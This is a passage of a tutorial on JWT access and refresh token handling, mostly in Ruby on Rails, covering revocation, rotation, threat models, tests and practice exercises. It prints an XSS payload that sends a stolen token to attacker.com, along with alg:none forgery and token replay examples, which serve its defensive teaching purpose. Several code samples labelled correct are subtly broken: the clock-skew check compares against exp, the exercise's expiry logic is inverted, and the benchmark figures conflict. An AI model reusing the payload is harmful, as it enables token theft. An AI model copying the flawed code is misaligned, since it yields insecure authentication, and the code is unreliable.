| Mobile/native apps | Token pair | No cookie jar available |
| Third-party integrations | OAuth with tokens | Delegated access without credentials |
| SPA + API | HttpOnly cookies or tokens | Depends on security requirements |

### Operational Settings Not to Leave at Defaults

#### 1. Logout Must Call Revocation

```ruby
# ❌ WRONG - Just clears local storage
def logout
  localStorage.removeItem('access_token')
  localStorage.removeItem('refresh_token')
  redirect_to '/login'
end

# ✅ CORRECT - Revokes tokens server-side
def logout
  access_token = request.headers['Authorization']&.split(' ')&.last
  refresh_token = cookies['refresh_token']
  
  # Revoke access token
  if access_token
    TokenRevocationService.revoke(access_token, token_type_hint: 'access_token')
  end
  
  # Revoke refresh token
  if refresh_token
    TokenRevocationService.revoke(refresh_token, token_type_hint: 'refresh_token')
  end
  
  # Clear local storage
  cookies.delete('refresh_token')
  
  redirect_to '/login'
end

# Revocation endpoint (RFC 7009)
class TokenRevocationController < ApplicationController
  skip_before_action :verify_authenticity_token
  
  def revoke
    token = params[:token]
    token_type_hint = params[:token_type_hint]
    
    if token_type_hint == 'refresh_token' || token_type_hint.nil?
      # Try to revoke as refresh token
      stored = RefreshToken.find_valid(token)
      if stored
        stored.update!(invalidated: true, revoked_at: Time.now)
      end
    end
    
    if token_type_hint == 'access_token' || token_type_hint.nil?
      # Try to revoke as access token
      jti = decode_jwt_without_verification(token)&.dig("jti")
      if jti
        Redis.current.setex("revoked:#{jti}", 3600, "1")
      end
    end
    
    head :ok
  end
end
```

#### 2. Idle vs Absolute Lifetime

```ruby
class RefreshToken < ApplicationRecord
  # Absolute lifetime: 30 days max
  ABSOLUTE_LIFETIME = 30.days
  
  # Idle timeout: 7 days of inactivity
  IDLE_TIMEOUT = 7.days
  
  def expired?
    # Check absolute lifetime
    return true if created_at < ABSOLUTE_LIFETIME.ago
    
    # Check idle timeout (reset on each use)
    return true if last_used_at < IDLE_TIMEOUT.ago
    
    false
  end
  
  def record_use!
    touch(:last_used_at)
  end
end

# On each refresh
def rotate_refresh_token(old_token)
  stored = RefreshToken.find_valid(old_token)
  
  if stored.expired?
    stored.update!(invalidated: true)
    raise AuthenticationError, "Refresh token expired - re-authenticate"
  end
  
  stored.record_use!
  # ... proceed with rotation
end
```

#### 3. Clock Skew Tolerance

```ruby
class TokenValidator
  # Allow 30 seconds of clock skew
  CLOCK_SKEW = 30
  
  def validate_expiration(exp_claim)
    now = Time.now.to_i
    expiration = exp_claim.to_i
    
    # Token is expired if current time > expiration + skew
    if now > expiration + CLOCK_SKEW
      raise AuthenticationError, "Token expired"
    end
    
    # Token is not yet valid if current time < expiration - skew
    if now < expiration - CLOCK_SKEW
      raise AuthenticationError, "Token not yet valid (clock skew)"
    end
    
    true
  end
end
```

#### 4. Reuse Detection Alerting

```ruby
class SecurityMonitoring
  def self.analyze_refresh_events(time_window: 1.hour)
    events = SecurityEvent.where(
      event_type: "refresh_token_reuse",
      detected_at: time_window.ago..Time.now
    )
    
    # Single event = likely concurrency
    if events.count == 1
      Rails.logger.info "Single refresh token reuse - likely concurrency issue"
      return
    end
    
    # Multiple events = potential attack
    if events.count > 5
      # Check if from same client version
      client_versions = events.pluck(:client_version).tally
      
      client_versions.each do |version, count|
        if count > 3
          Alert.create!(
            severity: "critical",
            title: "Token reuse pattern detected",
            description: "#{count} reuse events from client version #{version}",
            client_version: version,
            affected_users: events.where(client_version: version).pluck(:user_id).uniq
          )
        end
      end
    end
    
    # Spike tied to specific time
    events_by_minute = events.group_by { |e| e.detected_at.floor(1.minute) }
    spikes = events_by_minute.select { |_, evts| evts.count > 10 }
    
    spikes.each do |time, _|
      Alert.create!(
        severity: "high",
        title: "Token reuse spike",
        description: "#{events.count} reuse events at #{time}",
        detected_at: time
      )
    end
  end
end
```

---

## Implementation Guide

### Complete Working Example: Ruby on Rails

#### Project Structure

```
app/
├── controllers/
│   ├── authentication/
│   │   ├── tokens_controller.rb
│   │   └── revocations_controller.rb
│   └── application_controller.rb
├── models/
│   ├── refresh_token.rb
│   └── security_event.rb
├── services/
│   ├── token_validator.rb
│   ├── refresh_token_service.rb
│   └── token_revocation_service.rb
└── lib/
    └── jwt_claims_validator.rb
```

#### Token Issuance

```ruby
# app/controllers/authentication/tokens_controller.rb
module Authentication
  class TokensController < ApplicationController
    skip_before_action :verify_authenticity_token
    before_action :authenticate_client
    
    def create
      case params[:grant_type]
      when "authorization_code"
        handle_authorization_code
      when "refresh_token"
        handle_refresh_token
      when "client_credentials"
        handle_client_credentials
      else
        render json: { error: "unsupported_grant_type" }, status: :bad_request
      end
    end
    
    private
    
    def handle_authorization_code
      code = params[:code]
      code_verifier = params[:code_verifier]
      
      # Verify PKCE
      auth_request = AuthorizationCode.find_valid!(code)
      unless validate_pkce(auth_request.code_challenge, code_verifier)
        render json: { error: "invalid_grant" }, status: :bad_request
        return
      end
      
      # Generate tokens
      user = auth_request.user
      access_token = generate_access_token(user)
      refresh_token = generate_refresh_token(user)
      
      # Mark code as used
      auth_request.update!(used: true)
      
      render json: {
        access_token: access_token,
        token_type: "Bearer",
        expires_in: 900,
        refresh_token: refresh_token,
        scope: user.scopes.join(" ")
      }
    end
    
    def handle_refresh_token
      refresh_token = params[:refresh_token]
      
      begin
        result = RefreshTokenService.new.rotate(refresh_token, client_info)
        
        render json: {
          access_token: result[:access_token],
          token_type: "Bearer",
          expires_in: result[:expires_in],
          refresh_token: result[:refresh_token],
          scope: result[:scope]
        }
      rescue AuthenticationError => e
        render json: { error: "invalid_grant" }, status: :bad_request
      end
    end
    
    def generate_access_token(user)
      claims = {
        iss: ISSUER,
        sub: user.id.to_s,
        aud: "api.example.com",
        exp: 15.minutes.from_now.to_i,
        iat: Time.now.to_i,
        jti: SecureRandom.uuid,
        scope: user.scopes.join(" "),
        client_id: @client.id
      }
      
      JWT.encode(claims, private_key, "RS256", { kid: current_key_id })
    end
    
    def generate_refresh_token(user)
      token = SecureRandom.hex(32)
      
      RefreshToken.create!(
        user: user,
        token: BCrypt::Password.create(token),
        jti: SecureRandom.uuid,
        expires_at: 7.days.from_now,
        absolute_expires_at: 30.days.from_now,
        idle_timeout_at: 7.days.from_now
      )
      
      token
    end
  end
end
```

#### Resource Server Validation

```ruby
# app/controllers/application_controller.rb
class ApplicationController < ActionController::API
  before_action :authenticate_request
  
  private
  
  def authenticate_request
    auth_header = request.headers["Authorization"]
    
    unless auth_header&.start_with?("Bearer ")
      render json: { error: "missing_token" }, status: :unauthorized
      return
    end
    
    token = auth_header.split(" ") [1]
    
    begin
      @current_claims = TokenValidator.new.validate(token)
      @current_user = User.find(@current_claims["sub"])
    rescue AuthenticationError => e
      render json: { error: "invalid_token", message: e.message }, status: :unauthorized
    end
  end
  
  attr_reader :current_user, :current_claims
end

# Protected endpoint
class Api::V1::UsersController < ApplicationController
  before_action :require_scope, only: [:update, :destroy]
  
  def show
    render json: current_user
  end
  
  def update
    # current_user is available
    if current_user.update(user_params)
      render json: current_user
    else
      render json: { errors: current_user.errors }, status: :unprocessable_entity
    end
  end
  
  private
  
  def require_scope
    token_scopes = current_claims["scope"].to_s.split
    required = %w[user:write]
    
    unless (required - token_scopes).empty?
      render json: { error: "insufficient_scope" }, status: :forbidden
    end
  end
end
```

---

## Real-World Use Cases

### Use Case 1: Microservices Architecture

**Scenario:** E-commerce platform with 15+ microservices (catalog, cart, checkout, inventory, etc.)

**Solution:**
```mermaid
graph LR
    A[Client] -->|1. Login| B[Auth Service]
    B -->|2. Access Token + Refresh Token| A
    
    A -->|3. Access Token| C[Catalog Service]
    A -->|4. Access Token| D[Cart Service]
    A -->|5. Access Token| E[Checkout Service]
    A -->|6. Access Token| F[Inventory Service]
    
    G[Auth Service] -.->|Refresh only| A
    
    style B fill:#e1ffe1
    style G fill:#fff4e1
```

**Benefits:**
- No shared session store between services
- Each service validates tokens independently
- Horizontal scaling without coordination
- Clear security boundaries

### Use Case 2: Mobile Application

**Scenario:** iOS/Android app with offline support and background sync

**Implementation:**
```swift
class MobileAuthManager {
  private let keychain = KeychainHelper()
  private let tokenCache = TokenCache()
  
  func performAuthenticatedRequest(_ request: URLRequest) async throws -> Data {
    // Get valid access token
    let accessToken = try await getValidAccessToken()
    
    var authenticatedRequest = request
    authenticatedRequest.addValue("Bearer \(accessToken)", forHTTPHeaderField: "Authorization")
    
    let (data, response) = try await URLSession.shared.data(for: authenticatedRequest)
    
    guard let httpResponse = response as? HTTPURLResponse else {
      throw AuthError.invalidResponse
    }
    
    if httpResponse.statusCode == 401 {
      // Token expired, refresh and retry
      try await refreshTokens()
      return try await performAuthenticatedRequest(request)
    }
    
    return data
  }
  
  private func getValidAccessToken() async throws -> String {
    // Check if we have a valid cached token
    if let cached = tokenCache.getValidAccessToken() {
      return cached
    }
    
    // Refresh if needed
    if let refreshToken = keychain.getRefreshToken() {
      try await refreshTokens()
      return tokenCache.getValidAccessToken()!
    }
    
    throw AuthError.noValidToken
  }
}
```

### Use Case 3: Third-Party Integrations

**Scenario:** Allow partners to access specific API endpoints on your behalf

**OAuth 2.0 Flow:**
```mermaid
sequenceDiagram
    participant P as Partner
    participant U as User
    participant AS as Auth Server
    participant RS as Resource Server
    
    P->>U: Request access to your data
    U->>AS: Authorize with scopes: read:orders, read:inventory
    AS->>P: Authorization code
    P->>AS: Exchange code for tokens
    AS->>P: Access token (scoped) + Refresh token
    
    loop API Access
        P->>RS: Request with access token
        RS->>RS: Validate token + check scope
        RS->>P: Response
    end
    
    P->>AS: Refresh when expired
    AS->>P: New tokens
    
    Note over P,RS: Partner never sees user credentials<br/>Granular scope control<br/>Revocable access
```

---

## Common Pitfalls & Troubleshooting

### Pitfall 1: Not Verifying Audience

**Problem:** Tokens issued for one API accepted by another

```mermaid
graph TD
    A[Search API] -->|Issues token| B[Token with aud: search-api]
    B -->|Presented to| C[Admin API]
    C -->|❌ No audience check| D[Access Granted!]
    
    style D fill:#ffe1e1
```

**Solution:** Always verify audience against hardcoded constant

### Pitfall 2: Trusting Token Header Algorithm

**Problem:** Algorithm confusion attack

```ruby
# ❌ VULNERABLE
claims = JWT.decode(token, public_key, false) # Don't verify
algorithm = claims.header["alg"] # Attacker controls this!
JWT.decode(token, public_key, true, algorithm: algorithm)
```

**Solution:** Pin algorithm explicitly

### Pitfall 3: Storing Tokens in localStorage

**Problem:** XSS vulnerability leads to token theft

**Solution:** Use HttpOnly cookies for refresh tokens

### Pitfall 4: Not Handling Token Refresh Race Conditions

**Problem:** Multiple parallel requests trigger multiple refreshes

**Symptoms:**
- Excessive refresh token calls
- Reuse detection false positives
- User logged out unexpectedly

**Solution:** Implement single-flight refresh pattern

### Pitfall 5: Infinite Refresh Loops

**Problem:** Client keeps trying to refresh invalid token

```ruby
# ❌ BAD - infinite retry
def make_request
  response = http.get(url)
  
  if response.status == 401
    refresh_token
    return make_request # Infinite loop!
  end
end

# ✅ GOOD - retry once
def make_request
  response = http.get(url)
  
  if response.status == 401
    refresh_token
    response = http.get(url) # One retry
    
    if response.status == 401
      raise AuthenticationError, "Invalid credentials"
    end
  end
  
  response
end
```

### Troubleshooting Guide

| Issue | Symptoms | Diagnosis | Solution |
|-------|----------|-----------|----------|
| **"Token expired" immediately** | Token rejected right after issuance | Clock skew > 30s | Add clock skew tolerance |
| **"Invalid signature"** | Signature verification fails | Wrong public key or key rotation | Implement JWKS with kid lookup |
| **"Invalid audience"** | Token rejected by resource server | Audience mismatch | Verify aud claim matches service identifier |
| **Frequent logouts** | Users logged out unexpectedly | Refresh token rotation race | Implement single-flight refresh |
| **High auth server load** | Auth server overwhelmed | Too many introspections | Switch to local verification |
| **"Token reuse detected"** | False positive reuse alerts | Parallel refresh requests | Add grace period for rotation |

---

## Best Practices

### ✅ Do's

1. **Use short-lived access tokens** (5-15 minutes)
2. **Implement refresh token rotation** (RFC 9700)
3. **Verify all JWT claims** (iss, aud, exp, scope)
4. **Pin algorithm** (don't trust header)
5. **Use HttpOnly cookies** for refresh tokens in browsers
6. **Store tokens securely** (keychain, keystore, encrypted storage)
7. **Implement clock skew tolerance** (30 seconds)
8. **Add grace period for token rotation** (5 seconds)
9. **Log security events** (reuse, revocation)
10. **Use PKCE** for public clients
11. **Implement single-flight refresh** on client
12. **Call revocation on logout** (RFC 7009)
13. **Use JWKS** for key rotation
14. **Monitor token metrics** (refresh rate, failure rate)
15. **Set idle and absolute timeouts** for refresh tokens

### ❌ Don'ts

1. **Don't store tokens in localStorage** (XSS risk)
2. **Don't trust token header algorithm** (algorithm confusion)
3. **Don't skip audience verification** (cross-API token reuse)
4. **Don't use long-lived access tokens** (increases blast radius)
5. **Don't send refresh tokens to resource servers** (only to auth server)
6. **Don't log token values** (log jti instead)
7. **Don't implement infinite retry on 401** (causes loops)
8. **Don't use session cookies for APIs** (CSRF vulnerability)
9. **Don't skip error handling** (always rescue JWT errors)
10. **Don't hardcode signing keys** (use JWKS)

---

## Anti-Patterns

### Anti-Pattern 1: The "JWT as Session" Anti-Pattern

**Description:** Using JWT for server-side sessions with database storage

```ruby
# ❌ ANTI-PATTERN
# Defeats the purpose of JWT - you have the overhead without the benefits
def create_session(user)
  token = JWT.encode({ user_id: user.id }, secret, "HS256")
  Session.create!(user: user, token: token) # Storing in DB!
  token
end

def validate_session(token)
  session = Session.find_by(token: token) # DB lookup!
  session&.user
end
```

**Why it's bad:**
- Loses JWT benefit (no DB lookup)
- Adds JWT overhead (larger than session ID)
- Still has revocation complexity
- Worst of both worlds

**Solution:** Use JWT properly (stateless) OR use sessions properly (small IDs)

### Anti-Pattern 2: The "Never Expire" Anti-Pattern

**Description:** Issuing tokens with 1-year expiration "for convenience"

```ruby
# ❌ ANTI-PATTERN
access_token = JWT.encode(
  { user_id: user.id, exp: 1.year.from_now.to_i },
  secret, "HS256"
)
```

**Why it's bad:**
- Infinite blast radius if stolen
- Impossible to revoke effectively
- Violates principle of least privilege

**Solution:** Use 5-15 minute access tokens with refresh

### Anti-Pattern 3: The "Trust the Client" Anti-Pattern

**Description:** Letting client decide token parameters

```ruby
# ❌ ANTI-PATTERN
# Client sends desired expiration time
def issue_token
  claims = {
    user_id: user.id,
    exp: params[:expires_in] # Client controls this!
  }
  JWT.encode(claims, secret, "HS256")
end
```

**Why it's bad:**
- Client can request infinite lifetime
- Security policy bypass
- No server-side control

**Solution:** Server always determines token parameters

### Anti-Pattern 4: The "Monolithic Auth" Anti-Pattern

**Description:** Single auth service that introspects every token

```mermaid
graph LR
    A[Client] -->|1. Request| B[Auth Service]
    B -->|2. Introspect| C[Auth Service DB]
    C -->|3. Result| B
    B -->|4. Response| A
    
    D[Service 1] -->|5. Request| B
    E[Service 2] -->|6. Request| B
    F[Service 3] -->|7. Request| B
    
    style B fill:#ffe1e1
```

**Why it's bad:**
- Auth server becomes bottleneck
- Single point of failure
- Poor scalability
- Unnecessary network overhead

**Solution:** Use local verification with short-lived tokens

---

## Performance Considerations

### Performance Comparison

| Approach | Latency | Throughput | Scalability | Cost |
|----------|---------|------------|-------------|------|
| **Local JWT Verification** | ~1ms | Very High | Excellent | Low |
| **Introspection** | ~50-100ms | Medium | Poor | High |
| **Denylist Check** | ~5-10ms | High | Good | Medium |

### Optimization Strategies

#### 1. JWKS Caching

```ruby
class JWKSCache
  CACHE_TTL = 1.hour
  
  def initialize
    @cache = {}
    @mutex = Mutex.new
  end
  
  def get_key(kid)
    @mutex.synchronize do
      # Return cached key if available
      return @cache[kid] if @cache[kid] && @cache[kid][:expires_at] > Time.now
      
      # Fetch from JWKS endpoint
      jwks = fetch_jwks
      key = jwks[kid]
      
      # Cache it
      @cache[kid] = {
        key: key,
        expires_at: Time.now + CACHE_TTL
      }
      
      key
    end
  end
  
  def invalidate_key(kid)
    @mutex.synchronize do
      @cache.delete(kid)
    end
  end
  
  private
  
  def fetch_jwks
    response = HTTP.get("https://auth.example.com/.well-known/jwks.json")
    JSON.parse(response.body)
  end
end
```

#### 2. Token Validation Cache

```ruby
class TokenValidationCache
  CACHE_TTL = 30.seconds
  
  def initialize(redis)
    @redis = redis
  end
  
  def validate(token)
    jti = extract_jti(token)
    return false unless jti
    
    # Check cache first
    cached = @redis.get("token_valid:#{jti}")
    return cached == "true" unless cached.nil?
    
    # Validate token
    valid = validate_jwt(token)
    
    # Cache result (short TTL for revoked tokens)
    ttl = valid ? CACHE_TTL : 60
    @redis.setex("token_valid:#{jti}", ttl, valid ? "true" : "false")
    
    valid
  end
end
```

#### 3. Connection Pooling for Introspection

```ruby
class IntrospectionClient
  def initialize
    @pool = ConnectionPool.new(size: 10, timeout: 5) do
      HTTP.timeout(2).persistent("https://auth.example.com")
    end
  end
  
  def introspect(token)
    @pool.with do |http|
      response = http.post(
        "/oauth2/introspect",
        form: { token: token }
      )
      
      JSON.parse(response.body)
    end
  end
end
```

### Performance Benchmarks

```
Local JWT Verification:     ~1,000 tokens/second per core
Introspection (cached):     ~50 tokens/second per instance
Introspection (uncached):   ~10 tokens/second per instance
Denylist check (Redis):     ~200 tokens/second per instance
```

---

## Security Considerations

### Threat Model

```mermaid
graph TD
    A[Threats] --> B[Token Theft]
    A --> C[Token Replay]
    A --> D[Token Forgery]
    A --> E[Algorithm Confusion]
    
    B --> B1[XSS]
    B --> B2[Network Sniffing]
    B --> B3[Log Exposure]
    
    C --> C1[Reuse of Stolen Token]
    C --> C2[Replay Attacks]
    
    D --> D1[Weak Signing]
    D --> D2[Missing Signature Check]
    
    E --> E1[alg: none]
    E --> E2[Algorithm Switching]
    
    style A fill:#ffe1e1
    style B fill:#ffe1e1
    style C fill:#ffe1e1
    style D fill:#ffe1e1
    style E fill:#ffe1e1
```

### Security Checklist

#### Token Issuance
- [ ] Use RS256 (asymmetric) for JWT, not HS256
- [ ] Generate cryptographically random tokens (CSPRNG)
- [ ] Include all required claims (iss, sub, aud, exp, iat, jti)
- [ ] Set appropriate expiration times
- [ ] Include minimal necessary scopes
- [ ] Use PKCE for public clients

#### Token Validation
- [ ] Verify signature with correct public key
- [ ] Check issuer matches expected value
- [ ] Check audience matches this service
- [ ] Verify expiration with clock skew tolerance
- [ ] Validate scope covers requested operation
- [ ] Check jti against revocation list (if applicable)
- [ ] Pin algorithm (don't trust header)

#### Token Storage
- [ ] Use HttpOnly cookies for refresh tokens (browser)
- [ ] Use platform keystore (mobile/native)
- [ ] Hash tokens in database (like passwords)
- [ ] Never log token values
- [ ] Encrypt tokens at rest
- [ ] Use secure transmission (HTTPS only)

#### Token Refresh
- [ ] Implement rotation (single-use tokens)
- [ ] Detect reuse and revoke family
- [ ] Add grace period for network retries
- [ ] Implement single-flight refresh
- [ ] Monitor for reuse patterns

### Common Attack Vectors

#### 1. XSS Token Theft

**Attack:**
```javascript
// Attacker injects script
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  });
</script>
```

**Defense:**
- Use HttpOnly cookies for refresh tokens
- Implement Content Security Policy (CSP)
- Sanitize all user input
- Use modern frameworks with auto-escaping

#### 2. Algorithm Confusion

**Attack:**
```javascript
// Attacker modifies token header
{
  "alg": "none",  // No signature!
  "typ": "JWT"
}

// If server accepts "none" algorithm, attacker can forge tokens
```

**Defense:**
```ruby
# ✅ Always pin algorithm
JWT.decode(
  token,
  public_key,
  true,
  algorithm: "RS256"  # Pinned, not from header
)
```

#### 3. Token Replay

**Attack:**
```bash
# Attacker intercepts token
GET /api/admin HTTP/1.1
Authorization: Bearer eyJhbGc...

# Replays token later
GET /api/admin HTTP/1.1
Authorization: Bearer eyJhbGc...
```

**Defense:**
- Short token lifetime
- Use HTTPS only
- Implement DPoP or mTLS for high-value APIs
- Monitor for unusual patterns

#### 4. Refresh Token Theft

**Attack:**
```bash
# Attacker steals refresh token from database or logs
# Uses it to get new access tokens

POST /oauth2/token
grant_type=refresh_token
refresh_token=stolen_token
```

**Defense:**
- Hash tokens in database
- Implement rotation
- Detect reuse
- Bind to client (DPoP/mTLS)
- Monitor for anomalies

---

## Testing Strategies

### Unit Tests

```ruby
# spec/services/token_validator_spec.rb
RSpec.describe TokenValidator do
  let(:validator) { described_class.new }
  let(:jwks) { load_test_jwks }
  let(:valid_token) { generate_test_token }
  
  describe "#validate" do
    context "with valid token" do
      it "returns claims" do
        claims = validator.validate(valid_token, jwks)
        expect(claims["sub"]).to eq("user-123")
      end
    end
    
    context "with expired token" do
      it "raises AuthenticationError" do
        expired_token = generate_test_token(exp: 1.hour.ago.to_i)
        expect {
          validator.validate(expired_token, jwks)
        }.to raise_error(AuthenticationError, /expired/i)
      end
    end
    
    context "with wrong audience" do
      it "raises AuthenticationError" do
        wrong_aud_token = generate_test_token(aud: "wrong-api")
        expect {
          validator.validate(wrong_aud_token, jwks)
        }.to raise_error(AuthenticationError, /audience/i)
      end
    end
    
    context "with tampered signature" do
      it "raises AuthenticationError" do
        tampered = valid_token.sub("A", "B")
        expect {
          validator.validate(tampered, jwks)
        }.to raise_error(AuthenticationError)
      end
    end
  end
end
```

### Integration Tests

```ruby
# spec/requests/authentication_spec.rb
RSpec.describe "Authentication", type: :request do
  describe "POST /oauth2/token" do
    context "with valid authorization code" do
      it "issues access and refresh tokens" do
        auth_code = create(:authorization_code, user: user)
        
        post "/oauth2/token", params: {
          grant_type: "authorization_code",
          code: auth_code.code,
          code_verifier: auth_code.code_challenge
        }
        
        expect(response).to have_http_status(:ok)
        json = JSON.parse(response.body)
        
        expect(json["access_token"]).to be_present
        expect(json["refresh_token"]).to be_present
        expect(json["expires_in"]).to eq(900)
      end
    end
    
    context "with refresh token" do
      it "rotates refresh token" do
        old_refresh = create(:refresh_token, user: user)
        
        post "/oauth2/token", params: {
          grant_type: "refresh_token",
          refresh_token: old_refresh.raw_token
        }
        
        expect(response).to have_http_status(:ok)
        json = JSON.parse(response.body)
        
        expect(json["access_token"]).to be_present
        expect(json["refresh_token"]).not_to eq(old_refresh.raw_token)
        
        # Old token should be invalidated
        expect(old_refresh.reload).to be_invalidated
      end
      
      it "detects token reuse" do
        old_refresh = create(:refresh_token, user: user)
        
        # Use token twice (simulating theft)
        2.times do
          post "/oauth2/token", params: {
            grant_type: "refresh_token",
            refresh_token: old_refresh.raw_token
          }
        end
        
        # Second use should trigger security event
        expect(SecurityEvent.count).to eq(1)
        expect(SecurityEvent.last.event_type).to eq("refresh_token_reuse")
      end
    end
  end
end
```

### Security Tests

```ruby
# spec/security/token_security_spec.rb
RSpec.describe "Token Security", type: :security do
  describe "JWT validation" do
    it "rejects tokens with 'none' algorithm" do
      token = JWT.encode({ user_id: 1 }, nil, "none")
      
      expect {
        validator.validate(token, jwks)
      }.to raise_error(AuthenticationError)
    end
    
    it "rejects tokens with wrong issuer" do
      token = generate_token(iss: "evil.example.com")
      
      expect {
        validator.validate(token, jwks)
      }.to raise_error(AuthenticationError, /issuer/i)
    end
    
    it "rejects tokens with wrong audience" do
      token = generate_token(aud: "evil-api.example.com")
      
      expect {
        validator.validate(token, jwks)
      }.to raise_error(AuthenticationError, /audience/i)
    end
  end
  
  describe "Token storage" do
    it "does not log token values" do
      token = "secret_token_value"
      
      expect(Rails.logger).not_to receive(:info).with(token)
      
      # Perform operation that logs
      RefreshTokenService.find_by_token(token)
    end
  end
end
```

### Load Testing

```bash
# Using wrk - benchmark token validation
wrk -t12 -c400 -d30s --latency \
  -s post_token.lua \
  http://localhost:3000/oauth2/token

# Expected results:
# - Local JWT validation: ~10,000 req/s
# - Introspection: ~500 req/s
# - P99 latency < 10ms (local), < 200ms (introspection)
```

---

## Practice Exercises

### Exercise 1: Implement Secure JWT Validation

**Difficulty:** Intermediate | **Time:** 30 minutes

#### Problem Statement

You're building a resource server that validates JWT access tokens. The current implementation has a critical security vulnerability. Your task is to fix it.

#### Starting Code (Vulnerable)

```ruby
class TokenValidator
  def validate(token)
    # Decode without verification
    claims, _ = JWT.decode(token, nil, false)
    
    # Check expiration
    if claims["exp"] < Time.now.to_i
      raise "Token expired"
    end
    
    claims
  end
end
```

#### Requirements

1. Verify JWT signature using RS256
2. Check issuer matches `https://auth.example.com`
3. Check audience matches `api.example.com` (hardcoded)
4. Verify expiration with 30-second clock skew
5. Validate scope includes `read:data`
6. Handle all JWT errors gracefully
7. Use JWKS to resolve signing keys by `kid`

#### Solution

```ruby
require "jwt"
require "net/http"
require "json"

class TokenValidator
  JWKS_URL = "https://auth.example.com/.well-known/jwks.json"
  EXPECTED_ISSUER = "https://auth.example.com"
  EXPECTED_AUDIENCE = "api.example.com"
  CLOCK_SKEW = 30 # seconds
  
  def initialize
    @jwks_cache = {}
    @jwks_mutex = Mutex.new
  end
  
  def validate(token)
    # Step 1: Decode header to get kid
    header = JWT.decode(token, nil, false).last
    kid = header["kid"]
    
    unless kid
      raise AuthenticationError, "Missing key ID (kid) in token header"
    end
    
    # Step 2: Get public key from JWKS
    public_key = fetch_public_key(kid)
    
    # Step 3: Verify JWT with all claims
    claims = verify_claims(token, public_key)
    
    # Step 4: Validate scope
    validate_scope(claims["scope"])
    
    # Step 5: Check custom claims
    validate_custom_claims(claims)
    
    claims
  rescue JWT::DecodeError => e
    raise AuthenticationError, "Invalid token: #{e.message}"
  end
  
  private
  
  def verify_claims(token, public_key)
    JWT.decode(
      token,
      public_key,
      true, # Verify signature
      algorithm: "RS256", # Pinned algorithm
      iss: EXPECTED_ISSUER,
      verify_iss: true,
      aud: EXPECTED_AUDIENCE,
      verify_aud: true,
      verify_expiration: true,
      leeway: CLOCK_SKEW,
      verify_not_before: true
    ).first
  end
  
  def validate_scope(scope_string)
    scopes = scope_string.to_s.split
    
    unless scopes.include?("read:data")
      raise AuthorizationError, "Missing required scope: read:data"
    end
  end
  
  def validate_custom_claims(claims)
    # Add any custom validation logic
    if claims["account_status"] == "suspended"
      raise AuthorizationError, "Account is suspended"
    end
  end
  
  def fetch_public_key(kid)
    @jwks_mutex.synchronize do
      # Check cache
      cached = @jwks_cache[kid]
      if cached && cached[:expires_at] > Time.now
        return cached[:key]
      end
      
      # Fetch JWKS
      uri = URI(JWKS_URL)
      response = Net::HTTP.get(uri)
      jwks = JSON.parse(response)
      
      # Find key by kid
      key_data = jwks["keys"].find { |k| k["kid"] == kid }
      
      unless key_data
        raise AuthenticationError, "Unknown key ID: #{kid}"
      end
      
      # Import key
      jwk = JWT::JWK.import(key_data)
      public_key = jwk.public_key
      
      # Cache for 1 hour
      @jwks_cache[kid] = {
        key: public_key,
        expires_at: Time.now + 3600
      }
      
      public_key
    end
  end
end

# Usage
validator = TokenValidator.new

begin
  claims = validator.validate(access_token)
  user_id = claims["sub"]
  scopes = claims["scope"].split
  puts "Token valid for user #{user_id}"
rescue AuthenticationError => e
  puts "Authentication failed: #{e.message}"
  # Return 401
rescue AuthorizationError => e
  puts "Authorization failed: #{e.message}"
  # Return 403
end
```

#### Test Cases

```ruby
# Test 1: Valid token
token = generate_valid_token()
expect { validator.validate(token) }.not_to raise_error

# Test 2: Expired token
token = generate_valid_token(exp: 1.hour.ago.to_i)
expect { validator.validate(token) }.to raise_error(AuthenticationError, /expired/i)

# Test 3: Wrong audience
token = generate_valid_token(aud: "wrong-api")
expect { validator.validate(token) }.to raise_error(AuthenticationError, /audience/i)

# Test 4: Missing scope
token = generate_valid_token(scope: "read:other")
expect { validator.validate(token) }.to raise_error(AuthorizationError, /scope/i)

# Test 5: Tampered signature
token = valid_token.sub("A", "B")
expect { validator.validate(token) }.to raise_error(AuthenticationError)
```

---

### Exercise 2: Build Refresh Token Rotation System

**Difficulty:** Advanced | **Time:** 45 minutes

#### Problem Statement

Implement a refresh token rotation system with reuse detection and grace period handling.

#### Requirements

1. Implement token rotation (old token invalidated on use)
2. Add 5-second grace period for network retries
3. Detect token reuse and revoke entire token family
4. Log security events for reuse detection
5. Alert on suspicious patterns
6. Implement single-flight refresh on client

#### Solution

```ruby
# app/models/refresh_token.rb
class RefreshToken < ApplicationRecord
  belongs_to :user
  
  GRACE_PERIOD = 5.seconds
  
  scope :valid, -> {
    where(invalidated: false)
      .where("expires_at > ?", Time.now)
      .where("absolute_expires_at > ?", Time.now)
      .where("idle_timeout_at > ?", Time.now)
  }
  
  def expired?
    created_at < absolute_expires_at ||
    last_used_at < idle_timeout_at
  end
  
  def recently_rotated?
    rotated_at && rotated_at > Time.now - GRACE_PERIOD
  end
end

# app/services/refresh_token_service.rb
class RefreshTokenService
  def initialize
    @mutex = Mutex.new
  end
  
  def rotate(presented_token, client_info)
    @mutex.synchronize do
      # Hash the presented token
      token_hash = BCrypt::Password.create(presented_token)
      
      # Find matching token
      stored_token = find_token(presented_token)
      
      unless stored_token
        handle_reuse_attempt(presented_token, client_info)
        raise AuthenticationError, "Invalid refresh token"
      end
      
      # Check if recently rotated (grace period)
      if stored_token.recently_rotated?
        return {
          access_token: stored_token.last_access_token,
          refresh_token: stored_token.last_refresh_token,
          expires_in: 900,
          scope: stored_token.user.scopes.join(" ")
        }
      end
      
      # Generate new tokens
      new_access_token = generate_access_token(stored_token.user)
      new_refresh_token = generate_refresh_token(stored_token.user)
      
      # Invalidate old token
      stored_token.update!(
        invalidated: true,
        rotated_at: Time.now
      )
      
      # Create new token
      new_token = RefreshToken.create!(
        user: stored_token.user,
        token: BCrypt::Password.create(new_refresh_token),
        jti: SecureRandom.uuid,
        expires_at: 7.days.from_now,
        absolute_expires_at: 30.days.from_now,
        idle_timeout_at: 7.days.from_now
      )
      
      {
        access_token: new_access_token,
        refresh_token: new_refresh_token,
        expires_in: 900,
        scope: stored_token.user.scopes.join(" ")
      }
    end
  end
  
  private
  
  def find_token(presented_token)
    # Compare against all active tokens (in production, optimize this)
    RefreshToken.valid.each do |token|
      if BCrypt::Password.new(token.token) == presented_token
        token.update!(last_used_at: Time.now)
        return token
      end
    end
    nil
  end
  
  def handle_reuse_attempt(presented_token, client_info)
    # Log security event
    SecurityEvent.create!(
